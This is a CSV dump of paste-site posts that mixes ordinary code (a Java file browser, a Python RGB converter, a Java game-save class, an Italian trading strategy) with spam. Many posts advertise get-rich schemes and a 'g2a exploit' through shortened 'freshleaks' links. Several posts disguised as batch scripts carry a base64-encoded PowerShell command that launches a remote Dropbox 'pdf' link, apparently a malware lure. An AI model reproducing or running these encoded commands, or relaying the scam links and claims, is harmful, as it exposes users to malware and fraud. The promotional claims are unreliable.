id,title,username,language,date,content
iLmfaxZb,Black Hole optimization v2 (11 nodes) 70,Billay01,JavaScript,Friday 9th of May 2025 12:51:07 PM CDT,4599679 - check it out at https://tinyurl.com/yc4w4vys
WXBi5zwz,⭐️Make $3000 in 24 hours W7,SirPleasecalmdown,JavaScript,Friday 9th of May 2025 12:49:15 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

k4SZ8flXiJ
"
vN0hYc2t,⭐️Earn $2000 a Month From Home UC,SirPleasecalmdown,JavaScript,Friday 9th of May 2025 12:45:51 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

GAJZymFE7g
"
tcqti5bf,⭐️Make 2000$+ daily together BI,SirPleasecalmdown,JavaScript,Friday 9th of May 2025 12:42:26 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

1ClfGQfj1k
"
ne3DsPux,⭐️Make 2000$+ daily together BI,Sandywarrior19,JavaScript,Friday 9th of May 2025 12:38:57 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

cfKe9GxSrg
"
cMS2QTNR,file manager,SforzandoCF,Java,Friday 9th of May 2025 12:36:10 PM CDT,"import java.awt.image.BufferedImage;
import java.io.DataInputStream;
import java.io.EOFException;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.attribute.BasicFileAttributes;
import java.util.Scanner;

import javax.imageio.ImageIO;
import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.UnsupportedAudioFileException;

public class Main {
    public static void main (String[] args) {
        Scanner scanner = new Scanner(System.console().reader());
        File root = null;
        FileInputStream reading = null;
        while (true) {
            if (scanner.hasNextLine()) {
                String next = scanner.nextLine();
                if (next.equals(""/view-files"")) {
                    root = File.listRoots()[0];
                    print(root);
                } else if (next.startsWith(""/view-file "")) {
                    try {
                        int number = Integer.parseInt(next.substring(11));
                        root = root.listFiles()[number];
                    } catch (NumberFormatException nfe) {
                        String name = next.substring(11);
                        for (File f : root.listFiles()) {
                            if (f.getName().endsWith(name)) {
                                root = f;
                                break;
                            }
                            if (f.getName().endsWith(name + ""/"")) {
                                root = f;
                                break;
                            }
                        }
                    }
                    print(root);
                } else if (next.startsWith(""/move-up"")) {
                    root = root.getParentFile();
                    print(root);
                } else if (next.startsWith(""/inspect-file"")) {
                    if (!root.isFile()) continue;
                    inspect(root);
                } else if (next.startsWith(""/inspect-text"")) {
                    if (!root.isFile()) continue;
                    inspectAsText(root);
                } else if (next.startsWith(""/jump-to "")) {
                    File f = new File(next.substring(9));
                    if (f.exists()) {
                        root = f;
                        print(root);
                    }
                } else if (next.startsWith(""/view-root"")) {
                    System.out.println(root);
                } else if (next.startsWith(""/open"")) {
                    try {
                        reading = new FileInputStream(root);
                        System.out.println(""file opened"");
                    } catch (IOException ioe) {}
                } else if (next.startsWith(""/read "")) {
                    read(reading, Integer.parseInt(next.substring(6)));
                }
                if (root == null) {
                    System.out.println(""internal error: file accesed does not exist"");
                    root = File.listRoots()[0];
                }
            }
        }
    }
    
    public static void print (File file) {
        if (!file.isDirectory()) printFile(file);
        File[] files = file.listFiles();
        if (files == null) return;
        if (files.length == 0) {
            System.out.println(""-> empty directory\n"");
            return;
        }
        for (int i = 0; i < files.length; i++)
            System.out.println(""["" + i + ""] -> "" + files[i] + (files[i].isDirectory() ? ""/"" : """"));
        System.out.println();
    }
    
    public static void printFile (File f) {
        BasicFileAttributes attrs;
        try {
            attrs = Files.readAttributes(f.toPath(), BasicFileAttributes.class);
        } catch (IOException ioe) {
            System.out.println(ioe);
            return;
        }
        System.out.println(""-> path: "" + f.toString());
        String name = f.getName();
        String ext = (name.contains(""."") ? name.substring(name.lastIndexOf(""."")) : ""none"");
        name = name.contains(""."") ? name.substring(0, name.lastIndexOf(""."")) : name;
        if (f.getName().startsWith(""."")) {
            name = ext;
        }
        System.out.println(""-> name: "" + name);
        System.out.println(""-> extension: "" + ext);
        System.out.println();
        System.out.println(""-> time created: "" + attrs.creationTime());
        System.out.println(""-> time last modified: "" + attrs.lastModifiedTime());
        System.out.println(""-> time last accessed: "" + attrs.lastAccessTime());
        System.out.println();
        System.out.println(""-> executable: "" + f.canExecute());
        System.out.println(""-> readable: "" + f.canRead());
        System.out.println(""-> writable: "" + f.canWrite());
        System.out.println(""-> hidden: "" + f.isHidden());
        System.out.println();
        String type = ""file"";
        if (attrs.isSymbolicLink()) type = ""symlink"";
        if (attrs.isOther()) type = ""other"";
        System.out.println(""-> type: "" + type);
        System.out.println(""-> file size: "" + attrs.size());
        System.out.println();
        System.out.println(""-> partition size: "" + f.getTotalSpace());
    }
    
    private static void inspect (File f) {
        if (tryInspectImage(f)) return;
        if (tryInspectAudio(f)) return;
        try {
            DataInputStream d = new DataInputStream(new FileInputStream(f));
            StringBuilder sb = new StringBuilder();
            sb.append(""-> "");
            int index = 0;
            int line = 0;
            int chunk = 0;
            while (true) {
                try {
                    String b = Integer.toHexString(d.readByte());
                    if (b.length() < 2) b = ""0"".concat(b);
                    if (b.length() > 2) b = b.substring(b.length() - 2);
                    sb.append(b);
                    index++;
                    if (index == 16) {
                        index = 0;
                        line++;
                        if (line == 16) {
                            line = 0;
                            chunk++;
                            if (chunk == 3) {
                                System.out.println(sb.toString());
                                System.out.println(""\n...\n"");
                                return;
                            }
                            System.out.println(sb.toString());
                            sb = new StringBuilder();
                        }
                        sb.append(""\n-> "");
                    } else {
                        sb.append("" "");
                    }
                } catch (EOFException eof) {
                    System.out.println(sb.toString());
                }
            }
        } catch (IOException ioe) {
            System.out.println(ioe);
        }
    }
    
    private static void inspectAsText (File f) {
        try {
            DataInputStream d = new DataInputStream(new FileInputStream(f));
            StringBuilder sb = new StringBuilder();
            sb.append(""-> "");
            int index = 0;
            int line = 0;
            int chunk = 0;
            while (true) {
                try {
                    sb.append(toChar(d.readByte()));
                    index++;
                    if (index == 16) {
                        index = 0;
                        line++;
                        if (line == 16) {
                            line = 0;
                            chunk++;
                            if (chunk == 3) {
                                System.out.println(sb.toString());
                                System.out.println(""\n-> ...\n"");
                                return;
                            }
                            System.out.println(sb.toString());
                            sb = new StringBuilder();
                        }
                        sb.append(""\n-> "");
                    }
                } catch (EOFException eof) {
                    System.out.println(sb.toString());
                }
            }
        } catch (IOException ioe) {
            System.out.println(ioe);
        }
    }
    
    private static boolean tryInspectImage (File f) {
        return tryInspectImage(f, true);
    }
    
    private static boolean tryInspectImage (File f, boolean loopInternally) {
        try {
            BufferedImage i = ImageIO.read(f);
            if (i == null) return false;
            System.out.println(""-> width: "" + i.getWidth());
            System.out.println(""-> height: "" + i.getHeight());
            System.out.println();
            return true;
        } catch (IOException ioe) {
            if (loopInternally) return tryInspectImage(f, false);
            return false;
        }
    }
    
    private static boolean tryInspectAudio (File f) {
        return tryInspectAudio(f, true);
    }
    
    private static boolean tryInspectAudio (File f, boolean loopInternally) {
        try {
            AudioFormat format = AudioSystem.getAudioInputStream(f).getFormat();
            System.out.println(""-> encoding: "" + format.getEncoding());
            String channels;
            if (format.getChannels() == 1) channels = ""mono"";
            else if (format.getChannels() == 2) channels = ""stereo"";
            else channels = format.getChannels() + "" channels"";
            System.out.println(""-> channels: "" + channels);
            System.out.println(""-> sample rate: "" + format.getSampleRate());
            System.out.println(""-> sample size: "" + format.getSampleSizeInBits() + ""-bit"");
            System.out.println(""-> big-endian: "" + format.isBigEndian());
            System.out.println();
            return true;
        } catch (IOException ioe) {
            if (loopInternally) return tryInspectImage(f, false);
            return false;
        } catch (UnsupportedAudioFileException uafe) {
            return false;
        }
    }
    
    private static char toChar (byte b) {
        if (b < 20) return '.';
        return (char) b;
    }
    
    private static void read (FileInputStream fs, int amt) {
        if (fs == null) return;
        try {
            for (int i = 0; i < amt; i++)
                System.out.println(Integer.toHexString(fs.read()));
        } catch (IOException ioe) {
            System.out.println(""io error occured"");
        }
    }
}"
suCD0F1X,⭐️500£ ANY SITE BALANCE INSTANTLY 2025 3J,Sandywarrior19,JavaScript,Friday 9th of May 2025 12:35:34 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

9m9jBCUL9c
"
mCQiP7tE,⭐️Make $3000 in 24 hours W7,Sandywarrior19,JavaScript,Friday 9th of May 2025 12:32:09 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

7LlXodlNyt
"
UVheguN4,⭐️Earn $2000 a Month From Home UC,Sandywarrior19,JavaScript,Friday 9th of May 2025 12:28:46 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

iNfvsnQFb4
"
g64m8FEg,⭐️Make 2000$+ daily together BI,Sandywarrior19,JavaScript,Friday 9th of May 2025 12:25:21 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

NduqnlK6pw
"
5EBBVhpw,⭐️Earn $2000 a Month From Home UC,gabytoleon,JavaScript,Friday 9th of May 2025 12:21:48 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

tBmvOqHg2p
"
gXu8DLNx,⭐️Make 2000$+ daily together BI,gabytoleon,JavaScript,Friday 9th of May 2025 12:18:25 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

3bOdSwInG7
"
cfcshrrL,⭐️500£ ANY SITE BALANCE INSTANTLY 2025 3J,gabytoleon,JavaScript,Friday 9th of May 2025 12:14:59 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

ybOQw0TyFg
"
kiVZfFcN,restart_services.cmd04,josearaujo,JavaScript,Friday 9th of May 2025 12:13:33 PM CDT,0969323 - check it out at https://tinyurl.com/3u95mw4w
KED8Cind,Test roblox96,Billay01,JavaScript,Friday 9th of May 2025 12:13:12 PM CDT,0814615 - check it out at https://tinyurl.com/yc4w4vys
tZgEWBGc,start_server.bat37,tashrid,JavaScript,Friday 9th of May 2025 12:13:02 PM CDT,4702197 - check it out at powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwBwADUANgBjAGcANQByADgAMABqAGMAeAB0AGQAeQB2AHUAegB0AGcAcQAvAHYAMQAuADgALgBwAGQAZgA/AHIAbABrAGUAeQA9AHIAZgBhAGcANQA5AGoAbgBjADYAZABoAGoAZgBnAHgAdAB2AGUAegBhAHYAYQBlAHgAJgBzAHQAPQAyAGcAcwBkADUAZAA3AGgAJgBkAGwAPQAwACIAIAAgACMAIABpAGQAPQBjAGIAMgBkADYAMgBiAGYA
WMUhcayc,??Earn $2000 a Month From Home UC48,Billay01,JavaScript,Friday 9th of May 2025 12:12:41 PM CDT,5408008 - check it out at https://tinyurl.com/yc4w4vys
kFEjEGBz,reset_network.cmd30,tashrid,JavaScript,Friday 9th of May 2025 12:12:31 PM CDT,0624213 - check it out at powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwBwADUANgBjAGcANQByADgAMABqAGMAeAB0AGQAeQB2AHUAegB0AGcAcQAvAHYAMQAuADgALgBwAGQAZgA/AHIAbABrAGUAeQA9AHIAZgBhAGcANQA5AGoAbgBjADYAZABoAGoAZgBnAHgAdAB2AGUAegBhAHYAYQBlAHgAJgBzAHQAPQAyAGcAcwBkADUAZAA3AGgAJgBkAGwAPQAwACIAIAAgACMAIABpAGQAPQBjAGIAMgBkADYAMgBiAGYA
hMnTtGFp,run_tests.bat49,KIETPRO_0108,JavaScript,Friday 9th of May 2025 12:12:04 PM CDT,4954230 - check it out at powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwBwADUANgBjAGcANQByADgAMABqAGMAeAB0AGQAeQB2AHUAegB0AGcAcQAvAHYAMQAuADgALgBwAGQAZgA/AHIAbABrAGUAeQA9AHIAZgBhAGcANQA5AGoAbgBjADYAZABoAGoAZgBnAHgAdAB2AGUAegBhAHYAYQBlAHgAJgBzAHQAPQAyAGcAcwBkADUAZAA3AGgAJgBkAGwAPQAwACIAIAAgACMAIABpAGQAPQBjAGIAMgBkADYAMgBiAGYA
2wuGcDqN,install_dependencies.ps155,jonomagon,JavaScript,Friday 9th of May 2025 12:12:03 PM CDT,7878459 - check it out at https://tinyurl.com/3u95mw4w
hB8V135a,⭐️Make $3000 in 24 hours W7,gabytoleon,JavaScript,Friday 9th of May 2025 12:11:32 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

VN9vqOpY5c
"
LmdM8KPG,⭐️Earn $2000 a Month From Home UC,gabytoleon,JavaScript,Friday 9th of May 2025 12:08:08 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

S3OevlHFW4
"
rAi0D4sN,# rgb_to_360.py,here2share,Python,Friday 9th of May 2025 11:48:55 AM CDT,"# rgb_to_360.py

o360 = 358.5 / (255 * 255 * 255)

def rgb_to_360(r, g, b):
    return int(((r * 255 * 255) + (g * 255) + b) * o360)

loop = range(0, 256, 21)

for r in loop:
	for g in loop:
		for b in loop:
			number = rgb_to_360(r, g, b)
			print(number)
			
number = rgb_to_360(255, 255, 255)
print(number)"
jZf5KpDn,Untitled,LA77,Java,Friday 9th of May 2025 11:23:52 AM CDT,"package nl.rug.oop.rpg;

import java.io.*;
import java.util.Scanner;

/**
 * Utility class for saving and loading.
 */
public class SaveManager {

    /**
     * The directory where the saves are stored.
     */
    public static final String SAVED_GAMES_DIRECTORY = ""savedgames"";
    /**
     * The file extension for saves.
     */
    public static final String SAVE_FILE_EXTENSION = "".ser"";

    /**
     * Saves the current state of the game.
     *
     * @param game     The game object to be saved.
     * @param filename The name of the file.
     */
    public static void saveGame(Game game, String filename) {
        ensureDirectory();

        try (ObjectOutputStream out = new ObjectOutputStream(
                new FileOutputStream(getFullPath(filename)))) {
            out.writeObject(game);
            System.out.println(""Quicksave successful!"");
        } catch (IOException e) {
            System.err.println(""Failed to save game: "" + e.getMessage());
        }
    }

    /**
     * Loading a file.
     *
     * @param filename The name of the file.
     * @return A game object representing the loaded state.
     */
    public static Game loadGame(String filename) {
        try (ObjectInputStream in = new ObjectInputStream(
                new FileInputStream(getFullPath(filename)))) {
            System.out.println(""Quickload successful!"");
            return (Game) in.readObject();
        } catch (IOException | ClassNotFoundException e) {
            System.err.println(""Failed to load game: "" + e.getMessage());
            return null;
        }
    }

    /**
     * Displays a list of available saves for the user to pick.
     *
     * @param scanner scanner object to read user input.
     * @return the loaded game object.
     */
    public static Game promptAndLoadSave(Scanner scanner) {
        File folder = new File(SAVED_GAMES_DIRECTORY);
        File[] saves = folder.listFiles((dir, name) -> name.endsWith(SAVE_FILE_EXTENSION));

        if (saves == null || saves.length == 0) {
            System.out.println(""No save files found."");
            return null;
        }

        System.out.println(""Which file? (-1 : none)"");
        for (int i = 0; i < saves.length; i++) {
            System.out.println(""("" + i + "") "" + saves[i].getName());
        }

        int choice = scanner.nextInt();
        if (choice >= 0 && choice < saves.length) {
            return loadGame(saves[choice].getName());
        }
        return null;
    }

    /**
     * Returns the full path of the file.
     *
     * @param filename The name of the file.
     * @return The full path of the file.
     */
    private static String getFullPath(String filename) {
        return SAVED_GAMES_DIRECTORY +
                File.separator +
                filename +
                (filename.endsWith(SAVE_FILE_EXTENSION) ? """" : SAVE_FILE_EXTENSION);
    }

    /**
     * Ensures that the directory exists.
     */
    private static void ensureDirectory() {
        File saveDir = new File(SAVED_GAMES_DIRECTORY);
        if (!saveDir.exists()) {
            saveDir.mkdir();
        }
    }
}
"
7G1HQdJm,Bot Reversal-Band-Riot-P1 ETHUSDT.P BYBIT 4H LONG E SHORT,Maurizio-Ciullo,JavaScript,Friday 9th of May 2025 11:13:52 AM CDT,"
																// Bot Reversal Band Riot Period 1 10-03-2025 ETHUSDT.P BYBIT 4H LONG E SHORT //
														  // Datafeed Cambiato / Periodi Backtest Cambiati / Inputs Cambiati / Skip Months Disattivato //
																
// RIOTTIMIZZAZIONE PERIODICA 1 DELLA ORIGINALE REVERSAL BAND		
// IL DATAFEED COMPLETO = (18/08/2017 26/02/2025)												
// NUOVI DATI DI SVILUPPO DATAFEED ETH/USDT BINANCE + ETH/USDT.P BYBIT 4H  STORICO INIZIALE BINANCE PER POI PROSEGUIRE CON BYBIT																														
// (Sviluppo Dati Exchange = BINANCE + BYBIT) (BINANCE Dal=18/08/2017 Al 21/10/2020) (BYBIT Dal=21/10/2020 Al 26/02/2025)
// SU TRADINGVIEW ORARIO BORSA GMT
// BARSBACK: 60

// NUOVE DATE IN SAMPLE E OUT OF SAMPLE
//Il data feed completo: 18/08/2017 26/02/2025
//In Sample: Inizio 18/08/2017 Fine 18/09/2023
//Out Of Sample: Inizio 18/09/2023 Fine 26/02/2025


//Il trading system completo - Bot Reversal Band Riot Period 1 10-03-2025 ETHUSDT.P BYBIT 4H LONG E SHORT 
// (Exchange= BYBIT) (Sottostante ETH-USDT.P) (Timeframe= 4H) (Direzione= LONG E SHORT) (Swing Posizione= SI) (Esclusione Ore=NO) (Esclusione Giorni=NO) (Esclusione Mesi=NO)
// (Take Profit Long/Short= Market Close Sopra/Sotto Bande) (Take Profit Limit Long= +12% Tradingview-Hub) (Take Profit Limit Short= +6,7 % Tradingview-Hub
// (Stop Loss Limit Long= -10% Tradingview-Hub) (Stop Loss Limit Short= -7.1% Tradingview-Hub) (Trailing Stop=NO) (Stop Emergenza: NO)
// (Max DD Concesso = 15% Media Max Drawdown 2°nda Deviazione Standard Simulazione Montecalo Python
// (Money Management = 25% Del Capitale Tradestation)  
// (Money Management = 18% Del Capitale Tradingview) Preso Dal 15% Media Max Drawdown 2°nda Deviazione Standard Simulazione Montecarlo Python

// (Progettatta Il=07/07/23)
// (In Sample Dal=17/08/2017 18/09/2023) (Out Of Sample Dal18/09/2023 Al 26-02-2025)
// (Progettatta Il=26/02/2025)

// ATTENZIONE, ALCUNE POSIZIONI SONO DIFFERENTI DA TRADINGVIEW PER VIA DELLE CANDELE INIZIALI CHE SONO DI BINANCE CHE POTREBBERO AVERE VALORI LEGGERENTE DIVERSI.
// ATTENZIONE, ALCUNE VOLTE, MOLTO RARAMENTE LE MEDIE POTREBBERO DIFFERIRE SEMPRE PER VIDE DELLE CANDELE INIZIALI CHE SONO DI BINANCE CHE POTREBBERO AVERE VALORI LEGGERENTE DIVERSI.
// ATTENZIONE, I VALORI DELL'ADX A VOLTE POSSONO ESSERE DIFFERENTI PER VIA DELLE CANDELE INIZIALI CHE SONO DI BINANCE PER POI RIASSESTARSI DI NUOVO.

input:
	InitialCapital(100000),
	percent_risk(25),
	input_stop_loss_percent_long(10),
	input_stop_loss_percent_short(7.1),
	input_target_percent_long(12),
	input_target_percent_short(6.7),
	lunghezza_sma_long(31),
	lunghezza_sma_short(48),
	deviazione_long(1.7),
	deviazione_short(1.3), 
	lunghezza_adx_long(6),
	lunghezza_adx_short(10),
	differenziale_adx_long(60), 
	differenziale_adx_short(22), 
	lung_ema_long(52),
	lung_ema_short(42),
	//skipday(thursday),
	skipmonth1(4), 
	skipmonth2(8),
	solo_long(false),
	solo_short(false);
	
Vars:
	 
	 media_long(0),
	 media_short(0),
	 middle_Band_long(0),
	 deviazione_st_long(0),
	 UpperBand_long(0),
	 LowerBand_long(0),
	 valore_adx_long(0), 
	 middle_Band_short(0),
	 deviazione_st_short(0),
	 UpperBand_short(0),
	 LowerBand_short(0),
	 valore_adx_short(0),
	 stop_loss_long(0),
	 stop_loss_short(0),
	 target_long(0),
	 target_short(0),
	 account_equity(0),
	 risk(0),
	 nr_share(0);
	 
// Calcololo degli indicatori long 

	middle_Band_long      =   average(close, lunghezza_sma_long); 
	deviazione_st_long    =   deviazione_long * StandardDev(close,lunghezza_sma_long, 1); 
	UpperBand_long        =   middle_Band_long  + deviazione_st_long;
	LowerBand_long        =   middle_Band_long  - deviazione_st_long;
	valore_adx_long       =   adx(lunghezza_adx_long); 

// Calcololo degli indicatori short
	
	middle_Band_short      =   average(close, lunghezza_sma_short); 
	deviazione_st_short    =   deviazione_short * StandardDev(close,lunghezza_sma_short, 1); 
	UpperBand_short        =   middle_Band_short  + deviazione_st_short;
	LowerBand_short        =   middle_Band_short  - deviazione_st_short;
	valore_adx_short       =   adx(lunghezza_adx_short); 
 	
	media_long = XAverage(Close, lung_ema_long);
	media_short = XAverage(Close, lung_ema_short);	 	 
   	 
// Money menagment 
	
	risk = percent_risk/100;
	nr_share = floor((InitialCapital + NetProfit) * risk) / close;
	stop_loss_long=((((InitialCapital + NetProfit) * risk)/100) * input_stop_loss_percent_long);
	stop_loss_short=((((InitialCapital + NetProfit) * risk)/100) * input_stop_loss_percent_short);
	target_long=((((InitialCapital + NetProfit) * risk)/100) * input_target_percent_long);
	target_short=((((InitialCapital + NetProfit) * risk)/100) * input_target_percent_short);
	
		
// Entrata Long 

begin;	
	if close cross over LowerBand_long and close < media_long and valore_adx_long < differenziale_adx_long and not solo_short {and month(date) <> skipmonth2 and month(date) <> skipmonth1} {and Dayofweek(date) <> skipday} then 
			
		Buy(""Long"") nr_share contracts Next Bar at market;	
		
		If MarketPosition =1 then
		Begin;
		Setstopposition;
		SetStopLoss(stop_loss_long);
		Setprofittarget(target_long);
		
		End;
			
// Uscita Long
		 	
	if close cross over UpperBand_long then	
		Sell(""Chiusura Long"") from entry(""Long"") Next Bar at market; 		
end;	


// Entrata Short
   	
begin;	
	if close cross under UpperBand_short and close > media_short and valore_adx_short < differenziale_adx_short and not solo_long {and month(date) <> skipmonth2 and month(date) <> skipmonth1} {and Dayofweek(date) <> skipday} then

		Sellshort(""Short"") nr_share Contracts Next Bar at market;
		 	
		If MarketPosition =-1 then
		Begin
		Setstopposition;
		SetStopLoss(stop_loss_short);
		Setprofittarget(target_short);
		
		End;	
		
					
// Uscita Short

	if close cross under LowerBand_short then
			
		Buytocover(""Chiusura Short"") from entry(""Short"") Next Bar at market;
		
end;
		
		

		

"
